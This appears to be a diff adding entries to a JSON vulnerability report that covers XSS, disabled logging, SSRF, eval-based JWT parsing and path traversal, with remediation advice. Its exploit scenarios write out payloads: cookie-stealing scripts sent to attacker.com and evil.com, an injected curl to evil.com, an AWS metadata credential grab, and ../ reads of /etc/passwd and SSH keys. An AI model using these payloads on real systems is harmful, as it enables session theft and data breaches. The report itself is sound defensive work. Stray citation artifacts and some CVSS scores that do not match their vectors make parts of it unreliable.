+      "exploitability": "**Exploitability:** Relatively easy. The attacker needs the ability to submit a profile bio – which likely means they need to be a registered user (unless profiles are public). Assuming registration is open, anyone can create an account. From there, they simply input a payload like `<script>window.location='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>` into the bio field. No special tools are required; this can be done via the normal profile edit form or an intercepting proxy. The next time any user (or admin) browses the page containing that bio, the script runs. The only complexity is that the attacker must get someone to view the profile or affected page. But if profiles are public or the application has a social component, normal usage will trigger it. Attackers can also send a link to their profile to targets to ensure it’s viewed. Many XSS payloads and frameworks exist to automate stealing data once the script executes, making the process straightforward for an attacker.",
+      "affected_users": "Any user who views content that includes the malicious profile bio will be affected. That could be other customers browsing user profiles, or support/admin staff reviewing accounts. For instance, if there's an admin-only page to view user profiles, an admin could unwittingly trigger the XSS – which is worst-case, as it can lead to full admin session compromise. In general, the more users who can see the injected content, the bigger the impact. If profiles are publicly visible, even non-logged-in visitors could be affected (though stealing a non-logged-in visitor's cookie has no value, a script could attempt other exploits or recruit their browser for further attacks). Potentially **the entire user base** is at risk, especially if the payload is designed to propagate (though self-propagating XSS worms are rare in modern apps).",
+      "remediation": {
+        "recommendation": "Implement robust output encoding and input validation on all user-generated content. Specifically for the bio field, any HTML tags should be either escaped or filtered out. Use a templating engine or library that auto-escapes by default, or a sanitization library that allows only a safe subset of tags (if formatting is needed). Additionally, consider using Content Security Policy (CSP) headers to make it harder for injected scripts to execute (CSP can restrict script sources, mitigating some XSS impact). Ensure cookies (like session cookies) have HttpOnly and SameSite attributes to make theft via XSS more difficult. But the primary fix is **never trust user input in HTML output** – always sanitize or encode. After patching, test by attempting to inject `<script>` in the bio and confirm it is either stored in a neutralized form or blocked entirely.",
+        "complexity": "Medium – It can be straightforward to add escaping on the profile display page (e.g., render bio content as text rather than HTML). However, systematically fixing XSS might require reviewing all places where user content is displayed. Using frameworks or libraries that handle encoding (e.g., React, Angular, or OWASP ESAPI for Java) significantly reduces effort. If some HTML is allowed, integrate a proven sanitizer like DOMPurify or OWASP Java HTML Sanitizer. The development effort is moderate, but absolutely necessary for security."
+      },
+      "example_exploit_scenario": "Attacker Alice registers an account and in the “Bio” field of her profile she enters: `<script>fetch('https://evil.com/log?c='+encodeURIComponent(document.cookie))</script>`. This gets saved to the database. When Victim Bob (a logged-in user) visits Alice’s profile page, Bob’s browser loads the bio and executes the script, sending Bob’s session cookie to evil.com. Now Alice (the attacker) can use Bob’s session cookie to impersonate Bob on the site (if the cookie wasn’t HttpOnly). She logs in as Bob and finds Bob’s saved payment info and personal data, and potentially performs actions as Bob. In another scenario, if an admin user browses Alice’s profile (maybe to review content), the admin’s session could be stolen similarly, giving Alice administrator capabilities. This is essentially what occurred in the Samy MySpace worm incident – a stored XSS that stole session tokens and replicated – demonstrating how a simple script in a profile field can lead to widespread compromise."
+    },
+    {
+      "finding_id": "F-109",
+      "scanner": "Custom-Probe",
+      "scan_id": "cloud-meta-2025-06-15",
+      "timestamp": "2025-06-15T13:12:02Z",
+      "vulnerability": {
+        "owasp_id": "A09:2021",
+        "cwe_id": "CWE-778",
+        "title": "Audit logging disabled in order-svc",
+        "severity": "MEDIUM",
+        "description": "`logging.level=OFF` in `application.properties`",
+        "vector": "config"
+      },
+      "asset": {
+        "type": "container_image",
+        "image": "order-svc:1.1.0"
+      },
+      "detailed_description": "The `order-svc` application has its logging level set to **OFF**, meaning it does not produce security logs or perhaps any runtime logs at all. This is a configuration issue falling under OWASP A09:2021 (Security Logging and Monitoring Failures). **Impact:** If a security incident occurs (such as exploitation of another vulnerability), there will be **little to no record** of the activity on this service. For example, malicious requests, database errors from SQL injection attempts, or abnormal behavior might not be logged or noticed. This dramatically increases the difficulty of **detecting intrusions** and responding in a timely manner:contentReference[oaicite:46]{index=46}. Many breaches go unnoticed for weeks or months when logging is insufficient. In this case, an attacker could exploit something like F-101 or F-104 in `order-svc` and remain stealthy, since the service won’t log suspicious events or perhaps even critical errors. Moreover, lack of logs can hinder troubleshooting and forensics after an incident – you may not know what data was accessed or what actions were taken. While this misconfiguration may not directly enable an attack, it **exacerbates the impact** of other issues and violates best practices for operational security. (CWE-778 denotes insufficient logging of security-relevant events, which precisely describes this scenario.)",
+      "cvss": {
+        "base_score": 3.6,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "note": "Low direct severity. By itself, this doesn’t allow unauthorized access. However, it raises overall risk by allowing undetected exploits. We score it as Low because an attacker cannot leverage it to compromise the system, only to avoid detection. (If considering secondary impact – longer “dwell time” of attackers – that's not captured in CVSS.)"
+      },
+      "exploitability": "**Exploitability:** N/A in the traditional sense. This is a weakness rather than an actively exploitable flaw. However, attackers **benefit greatly** when logging is off, as it means they can operate without fear of alerting defenders. In a stealth sense, the lack of logging is *exploitable* post-compromise: after gaining access via another vulnerability, the attacker can do more without leaving traces. For example, they could create accounts, exfiltrate data, or pivot to other systems, and the usual monitoring systems might not catch it since `order-svc` isn’t reporting events. Penetration testers often report insufficient logging because it increases the likelihood that real attacks go unnoticed. (Industry data shows average breach detection time can be on the order of weeks; insufficient logging contributes to that.)",
+      "affected_users": "No user data is directly exposed by this, but **all users are indirectly affected** because a breach could go undetected and unmitigated for a long period. For example, if an attacker quietly exploits a flaw and siphons off customer data from `order-svc` without logs, the company might only discover it far later (if at all), meaning users’ data could be continuously compromised. Also, from a compliance perspective, lack of audit logs might violate standards (for instance, PCI DSS requires logging of access to payment data). So the business and by extension its customers could face legal and trust issues if an incident happens and there's no audit trail. In summary, while no immediate user-facing impact, the *risk to all users’ data and transactions* increases due to the potential for undetected malicious activity.",
+      "remediation": {
+        "recommendation": "Enable appropriate logging on `order-svc`. Set `logging.level` to INFO (or DEBUG for development) and ensure that security-relevant events (logins, access control failures, input validation errors, transactions) are being logged. Integrate a centralized log management solution (e.g., ELK stack or Splunk) and establish alerts for suspicious activities (like multiple failed logins, or unusual order access patterns). Also, ensure logs are stored securely and retained for a sufficient period for forensic purposes. Essentially, implement the controls from OWASP A09: have monitoring and alerting on these logs. After enabling logging, test it: attempt some known bad inputs or actions and verify they appear in the logs. Also consider implementing an Intrusion Detection/Prevention System or an Application Performance Monitoring tool that can provide insight even if application logs are sparse.",
+        "complexity": "Low – Changing a configuration flag to turn logging on is straightforward. The main work is deciding the appropriate level and content to log (avoid overly verbose logging that creates noise, but include key security events). The application might need a restart to apply new logging settings. Implementing centralized logging infrastructure is more effort, but the configuration on the app side is simple. Care must be taken not to log sensitive data (to avoid creating new leaks), but that’s a matter of policy. Overall, enabling and improving logging is a quick win with significant security benefits."
+      },
+      "example_exploit_scenario": "Six months after deployment, `order-svc` still has logging disabled. During that time, an attacker exploited the SQL injection (F-101) to dump the orders database and also ran an RCE exploit (F-104) to establish a backdoor. Because logging was off, these actions produced no alerts or records. The attacker regularly queries the database for new orders and extracts customer info, going undetected. Normally, spikes in certain errors or unusual access patterns might appear in logs and trigger alarms, but here there is nothing. It’s only when customers complain about suspicious transactions that the company investigates and realizes there were no logs to trace what happened. This delay allowed the attacker to maintain **a 6-month dwell time** inside the system (far above the global median of ~16 days for detected intrusions:contentReference[oaicite:48]{index=48}). The lack of audit logging directly contributed to the prolonged breach and increased damage."
+    },
+    {
+      "finding_id": "F-110",
+      "scanner": "BurpSuite",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:38:29Z",
+      "vulnerability": {
+        "owasp_id": "A10:2021",
+        "cwe_id": "CWE-918",
+        "title": "SSRF via image upload feature",
+        "severity": "HIGH",
+        "description": "`/api/v1/upload` fetches external URL without whitelist",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "api_endpoint",
+        "url": "https://api.shop.local/v1/upload",
+        "service": "media-svc"
+      },
+      "detailed_description": "The file upload API accepts a URL as input and fetches the resource from that URL (perhaps to allow importing images by URL). Because there is no whitelist or proper validation, this endpoint is vulnerable to **Server-Side Request Forgery (SSRF)** (CWE-918). An attacker can supply an arbitrary URL and the server will perform the request on behalf of the attacker. **Impact:** The attacker can **force the server to make requests to internal or otherwise restricted resources** that the attacker themselves cannot directly access. For example, the attacker could use the upload feature to have the server request `http://169.254.169.254/latest/meta-data/` (the AWS EC2 instance metadata service) and return sensitive information like cloud credentials. They could also probe internal network services (port scanning via timing or error responses), access internal HTTP endpoints (e.g., `http://localhost:8080/admin`) that are not exposed publicly, or retrieve server-local files via a `file://` URI if the application treats that as a URL. Essentially, the server becomes a proxy that can bypass firewalls and network restrictions. In a worst-case scenario, SSRF can lead to full cloud infrastructure compromise – for instance, the infamous Capital One breach was caused by SSRF access to AWS instance metadata. This vulnerability is designated OWASP A10:2021. The lack of an allowlist or other safeguard makes this a serious issue, as indicated by Burp’s high severity rating.",
+      "cvss": {
+        "base_score": 9.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "note": "High severity. SSRF often results in **Scope Change** (attacker gains access to internal systems/resources). This score assumes the server can access internal sensitive data (High confidentiality impact) but cannot directly modify those systems (Integrity not directly impacted by the SSRF itself). If we assumed no scope change, it would be around 7.5. But because SSRF can pivot to other systems, treating S as Changed is appropriate, elevating it to critical range."
+      },
+      "exploitability": "**Exploitability:** Easy. The attacker just needs to find a way to provide a URL to the upload endpoint. If the endpoint is something like `POST /v1/upload` with JSON body `{ \"imageUrl\": \"http://attacker.com/malicious.jpg\" }`, the attacker can simply replace the URL with internal addresses. No credentials or special tools required – any HTTP client (even a web form or curl) works. There may be a minor hurdle in guessing internal addresses, but common targets (like metadata IP `169.254.169.254` or default internal hostnames) are well-known. Many automated SSRF scripts exist that will try lists of internal IPs once an SSRF is found. The reliability of the exploit is high: the server will attempt to fetch whatever URL is given. If the response is returned directly to the attacker, exploitation is trivial (direct data exfiltration). If the response is not returned (e.g., the server only saves the image), the attacker might use side-channels (like time delays or error messages) to infer data. These techniques are well-documented in SSRF research. Since the service likely runs in a high-privilege network context (inside the cluster), the attacker has a good chance of reaching sensitive endpoints.",
+      "affected_users": "Indirectly, all users of the service are affected because SSRF can be used to compromise the infrastructure or database that hold user data. For example, using SSRF an attacker might obtain credentials for the database (via cloud metadata or config file access) and then steal all user information from that database. Users wouldn’t know this happened until long after. Additionally, if the media service stores user-uploaded files, an attacker could potentially enumerate and download all of them (including those not meant to be public). Essentially, SSRF is often a gateway to deeper system compromise; once internal trust boundaries are broken, all data/processes in the internal network (and thus all users’ data) could be accessed or affected. So while users might not see an immediate effect, the risk to their data and the platform’s integrity is very high.",
+      "remediation": {
+        "recommendation": "Implement strict input validation and handling for any URL or remote resource fetch. Ideally, **do not allow arbitrary URLs** to be fetched by the server. If the feature is intended to fetch images by URL, enforce an allowlist of domains (e.g., only allow URLs from your own CDN or storage buckets). Also, perform DNS resolution in a safe way (to prevent DNS rebinding attacks) and block private IP ranges in the URL (so an URL to `10.x.x.x` or `169.254.169.254` is rejected). On the network side, restrict the container’s egress traffic: the service should not need to access internal admin endpoints or the cloud metadata IP, so use firewall rules to block those. Additionally, do not return raw error messages from the fetch; a generic error will limit an attacker’s ability to perform network scanning. After implementing restrictions, test by trying to access known disallowed addresses (like `http://localhost` or `http://169.254.169.254`) through the API and ensure it is blocked or sanitized.",
+        "complexity": "Medium – Patching SSRF might involve changes in both code and infrastructure. From a code perspective, validating the URL (parsing it, checking hostname against an allowlist or regex) is straightforward. If the application needs to allow user-specified URLs, implementing a robust allow/deny logic is required. Network-level mitigations (firewall rules, VPC settings) add defense in depth but may require coordination with DevOps/cloud teams. Overall, the changes are not conceptually complex, but thorough testing is needed to avoid breaking legitimate functionality (if any) and to ensure all SSRF vectors are covered (including redirects, DNS rebinding, etc.)."
+      },
+      "example_exploit_scenario": "The attacker discovers the `/v1/upload` API endpoint, which takes a JSON body with a `url` parameter for an image. They send a request: `{ \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }`. The service, running on AWS, dutifully fetches the AWS instance metadata URL. Because no authentication is required internally, it returns temporary AWS credentials for the EC2 instance role. The response (containing keys and tokens) is then returned to the attacker (or perhaps stored, but the attacker might trigger an error to see it). Now armed with AWS keys, the attacker uses AWS API calls to list S3 buckets and download sensitive data – effectively pivoting from the SSRF to a full cloud breach. In another scenario, the attacker uses SSRF to access an internal admin panel at `http://localhost:8080/admin` which is not exposed externally. Through the upload proxy, they retrieve the admin page and potentially find a way to execute admin actions. These examples show how a simple URL fetch can escalate into a complete compromise of systems."
+    },
+    {
+      "finding_id": "F-111",
+      "scanner": "Semgrep",
+      "scan_id": "code-2025-06-18",
+      "timestamp": "2025-06-18T22:51:10Z",
+      "vulnerability": {
+        "owasp_id": "A08:2021",
+        "cwe_id": "CWE-502",
+        "title": "Insecure deserialization of JWTs",
+        "severity": "HIGH",
+        "description": "`eval(atob(jwt.payload))` pattern in `tokenUtil.js`",
+        "vector": "code"
+      },
+      "asset": {
+        "type": "source_file",
+        "path": "services/auth-svc/src/utils/tokenUtil.js",
+        "repo": "github.com/org/shop"
+      },
+      "detailed_description": "The code in `tokenUtil.js` is taking the JSON Web Token (JWT) payload, Base64-decoding it (`atob(jwt.payload)`), and then using `eval(...)` on that decoded string. This is an **insecure deserialization / code execution** vulnerability. Essentially, the application is treating token data as code. If an attacker can control or forge the JWT payload (for example, by exploiting weak signature verification or using a known key), they can inject arbitrary JavaScript that will be executed on the server when it attempts to parse the token. **Impact:** This can lead to **remote code execution on the server**, as the `eval` will run with the server's privileges. For instance, an attacker could craft a JWT with a payload that, when eval’d, executes a system command or exfiltrates data. Even if the intention was merely to parse JSON, using `eval` means an attacker can break out of the JSON context and run any code. This is extremely dangerous – it's equivalent to unserializing untrusted data (CWE-502) or executing user input directly. It also indicates a failure in the JWT validation process (JWTs should be cryptographically verified and parsed, not executed). OWASP A08:2021 (Software and Data Integrity Failures) covers this scenario where the system blindly trusts data and executes it.",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "Critical severity. If an attacker can supply or modify a token and the server executes it, that’s a straightforward network-exploitable RCE. We assume worst-case that signature verification can be bypassed or is absent (which is common in these flawed implementations). This yields a CVSS roughly 9.8 (Critical) since no privileges or user interaction are required and impact is total."
+      },
+      "exploitability": "**Exploitability:** High, *if* the attacker can manipulate the JWT. There are known tricks to achieve this: for example, if the server does not properly verify signatures or accepts `alg: 'none'` tokens, an attacker can simply supply a token with a malicious payload. Even if the server uses HMAC signing, if the secret is weak or leaked, the attacker can forge a token. Once the attacker can control the content of `jwt.payload` (the decoded JSON), they can include any JavaScript. For example, they could set `jwt.payload = \"'); require('fs').writeFileSync('pwned.txt','Hacked');//\"` (embedded in a JSON string) such that when eval runs, it writes a file. In practice, many JWT libraries historically had issues like accepting `alg: 'None'` (which means no signature) or algorithm confusion attacks, allowing attackers to bypass verification. Assuming the attacker can exploit one of those and get the server to eval an arbitrary payload, achieving RCE is trivial. Tools to craft custom JWTs (like jwt.io or custom scripts) and knowledge of the server’s JWT secret (or a guessable secret) may be needed, but these are within reach for a skilled attacker. This pattern of `eval(atob(token))` is a glaring vulnerability that a penetration tester or attacker would quickly try to exploit.",
+      "affected_users": "All users are indirectly at risk because if the auth service (or whichever service includes this code) is compromised, the attacker can undermine authentication and impersonate any user. Specifically, if this is in `auth-svc`, an attacker could use it to run code that creates a backdoor or dumps the entire user database, including password hashes and personal data. They could also mint valid tokens for any identity (admin or user) and thus access other services as those users. Essentially, a code execution in the auth service means **the compromise of the entire application and all user accounts**. Even users not currently active could be impacted (e.g., the attacker could mark all accounts as verified, or change passwords, etc.). It’s a catastrophic scenario for user security.",
+      "remediation": {
+        "recommendation": "Never use `eval` on JWT data (or any user input). Refactor `tokenUtil.js` to parse the JWT payload as JSON using a safe method, *after* verifying the token’s signature. For example, use `JSON.parse(atob(jwt.payload))` instead of eval. Better yet, use a standard JWT library that will handle base64 decoding and signature verification in one step (e.g., the jsonwebtoken library in Node). Ensure that JWT signatures are properly verified using a strong secret or key, and do not accept tokens with `alg: none`. Essentially, treat the JWT payload as untrusted data. Also, add checks to avoid known JWT attacks: enforce expected algorithms and token formats, use strong secrets, and possibly implement token expiration/invalidation properly. After making these changes, thoroughly test token handling – send an invalid token and ensure it’s rejected, and confirm that no part of it is executed. In addition, consider implementing a Content Security Policy for Node (like disabling eval via Node’s `--disable-eval` flag or using a code linter to prevent usage of eval) to catch this in development. Training developers on secure JWT usage would also help prevent such mistakes.",
+        "complexity": "Low – Removing an `eval` call in favor of a safe JSON parse is straightforward. Adopting a well-tested JWT library might require minor adjustments in how tokens are issued and decoded but is a one-time effort. The biggest complexity might be invalidating any tokens that might have been compromised if this was abused (you might consider rotating secrets or forcing re-login for all users after fixing, out of caution). The code change itself is simple; the overarching need is to improve the security design around JWT handling."
+      },
+      "example_exploit_scenario": "Suppose the application expects an `Authorization: Bearer <JWT>` header for protected endpoints. The attacker crafts a JWT with a payload that contains a malicious snippet. They know (or guess) that the server isn’t verifying signatures (or they exploit a *none* algorithm acceptance). They create a token with header `{ \"alg\": \"none\" }` and payload `{\"exp\":9999999999,\"user\":\"guest\"}` but they inject `\"; require('child_process').exec('curl http://evil.com/`hostname`'); //` into the payload string. After Base64 encoding, they send this token. On the server, `atob(jwt.payload)` yields a string that, when eval’d, executes the curl command, sending the server’s hostname to the attacker (proof of code execution). With confirmation of RCE, the attacker can follow up: they craft another token payload to read environment variables or even open a reverse shell. Essentially, they have turned the authentication mechanism into a remote code execution vector. Once they have a shell on the auth server, they dump the user database (or simply query the in-memory user objects if available), obtaining all user credentials and personal data. They also retrieve the JWT signing secret from memory/config. With that, they can create valid JWTs for any user or admin and further exploit other services. All of this stems from the single line `eval(atob(jwt.payload))` running on an unverified token."
+    },
+    {
+      "finding_id": "F-112",
+      "scanner": "OWASP ZAP",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:41:17Z",
+      "vulnerability": {
+        "owasp_id": "A03:2021",
+        "cwe_id": "CWE-73",
+        "title": "Path traversal in download endpoint",
+        "severity": "HIGH",
+        "description": "`../../etc/passwd` readable via `file` param",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "api_endpoint",
+        "url": "https://api.shop.local/v1/download",
+        "service": "media-svc"
+      },
+      "detailed_description": "The download API (`/v1/download`) is vulnerable to **Path Traversal** (Directory Traversal). It likely takes a `file` parameter and directly appends it to a server directory path when reading files. By inserting `../` sequences, an attacker can break out of the intended folder and read arbitrary files on the server’s filesystem. For example, a request to `/v1/download?file=../../etc/passwd` will retrieve the Unix password file, as ZAP indicates. **Impact:** An attacker can retrieve sensitive files that should normally be inaccessible via the web. This includes configuration files with credentials (database connection strings, API keys), application source code or keys, sensitive operating system files, or user data files. In some cases, path traversal can also be used to access special paths (like device files) or to achieve code execution (for example, by reading server logs or configuration files that contain secrets that can be leveraged). Primarily, though, this is an **information disclosure** issue (Confidentiality breach). The information gained can facilitate deeper attacks. For example, reading application config files may yield admin credentials or cloud service keys. In certain setups, if file writes are possible elsewhere, path traversal might even be used to plant a web shell (though here it appears read-only). This flaw is categorized under OWASP A03:2021 (Injection) since it involves injecting path syntax. It maps to CWE-73 (External Control of File Path) and is closely related to CWE-22 (Path Traversal).",
+      "cvss": {
+        "base_score": 7.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "note": "High severity (primarily Confidentiality impact). The attacker requires no privileges and no user interaction to exploit (just a crafted URL). The impact is read access to sensitive data (C:H). Integrity/Availability aren’t directly affected by just reading files. If traversal could lead to RCE, impact would be higher, but here we consider the direct impact."
+      },
+      "exploitability": "**Exploitability:** Very easy. This attack can be done with a web browser or simple scripts. The attacker just needs to try `../` patterns in the `file` parameter. Common targets like `/etc/passwd` (to test Linux) or `..\windows\win.ini` (to test Windows) are well-known. There are automated tools (like `dotdotpwn`) but manual trial often suffices. The server isn’t filtering `../`, so each attempt will succeed if the file exists and is readable by the application. The only limitation might be OS permissions, but web apps often run with enough privileges to read most non-system files. Attackers can systematically download config files (e.g., `/../../app/config.yaml`), source code, logs, or other users’ files. This requires no special knowledge beyond guessing file paths. If the directory structure is known (sometimes revealed in error messages or by known conventions), exploitation is even faster. ZAP itself discovered `../../etc/passwd`, confirming the weakness.",
+      "affected_users": "All users could be indirectly affected since sensitive server-side information can be stolen. For example, if database credentials are stored in a config file and an attacker reads it, they could then connect to the database and dump all user data (affecting every user). If source code is stolen, attackers might find other vulnerabilities affecting users. If any user-uploaded files are stored on disk by filename, the attacker might enumerate and read all such files, violating those users’ privacy. Essentially, while this vulnerability is on the server, it can expose personal data or keys that protect user information. So it threatens the security of all data on the server, and thus the privacy and integrity of all users’ information.",
+      "remediation": {
+        "recommendation": "Implement strict validation or sanitization on the `file` parameter. The application should **not allow directory traversal sequences**. This can be done by rejecting any inputs containing `../` or `..\\`, or by normalizing the path and ensuring it stays within an allowed directory. For example, if files should only be served from `/var/www/media/`, then after appending the user input, resolve the path and verify it still begins with `/var/www/media/` before accessing it. Better yet, do not use raw filenames from user input at all – use an identifier or a lookup table so that users never directly control filesystem paths. Additionally, ensure the web server or application is running with minimal privileges, so even if traversal is attempted, it cannot access highly sensitive system files. After fixing, test by requesting known disallowed paths (like `/etc/passwd`) to ensure the application returns a safe error or filters out the traversal attempt.",
+        "complexity": "Low – Preventing path traversal is straightforward. You can sanitize the input by removing any `..` sequences or by using built-in path normalization functions. If the application framework has a safe file-serving mechanism, use that instead of writing your own. The main effort might be to identify all endpoints where file paths are used and apply similar fixes. It’s also important to consider Unicode or URL-encoded bypasses (e.g., `%2e%2e/` should also be caught). But overall, the fix is simple and well-documented. Developers should also add unit tests for these cases to prevent regressions."
+      },
+      "example_exploit_scenario": "During testing, an attacker finds that `GET https://api.shop.local/v1/download?file=receipt.pdf` returns a PDF of an order receipt. They then try `GET https://api.shop.local/v1/download?file=../../../../etc/passwd` and successfully retrieve the server’s passwd file (containing user accounts). Now convinced of the vulnerability, the attacker escalates: they request `../../../../shop/config/production.json` (guessing a config path) and retrieve it, finding database credentials inside. Using those credentials, they connect to the database and dump all customer personal data. They also download the application’s source code via `../../../../var/www/shop/app.js`. In another angle, they try `../../../../etc/ssh/ssh_host_rsa_key` hoping to get the server’s private SSH key (if the app user has read access, that would be critical). Essentially, the attacker is able to roam the filesystem and pick up any sensitive files at will. This leads to a full compromise of data confidentiality. The only hint was that the download functionality did not restrict file paths, allowing the classic `../` attack."
+    }
+  ]
+  
